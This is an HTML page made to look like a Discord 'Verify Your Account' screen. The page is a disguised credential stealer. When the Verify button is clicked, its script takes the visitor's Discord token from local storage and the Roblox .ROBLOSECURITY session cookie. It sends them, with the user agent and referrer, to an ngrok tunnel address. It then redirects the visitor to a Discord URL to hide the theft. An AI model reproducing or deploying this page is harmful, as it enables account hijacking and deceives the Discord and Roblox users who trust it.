<!DOCTYPE html>
<html>
<head>
    <title>Discord Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393f;
            color: white;
            text-align: center;
            padding: 50px;
        }
        .container {
            background-color: #2f3136;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
        }
        button {
            background-color: #7289da;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #677bc4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Account</h1>
        <p>Click the button below to verify your account.</p>
        <button onclick="collectData()">Verify</button>
    </div>
<script>
    function collectData() {
        const discordToken = localStorage.getItem('token') || 'N/A';
        const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || 'N/A';
        const userAgent = navigator.userAgent;
        const referrer = document.referrer;

        // Send data to your backend
        fetch('https://afc6-2a02-8084-e80-3400-493f-95a1-6f55-d710.ngrok-free.app/submit', {
            method: 'POST',  // Ensure this is a POST request
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ discordToken, robloxCookie, userAgent, referrer }),
        }).then(response => {
            if (response.ok) {
                window.location.href = "https://discord.com/verification-success";
            }
        }).catch(error => {
            console.error('Error:', error);
        });
    }
</script>
</body>
</html>
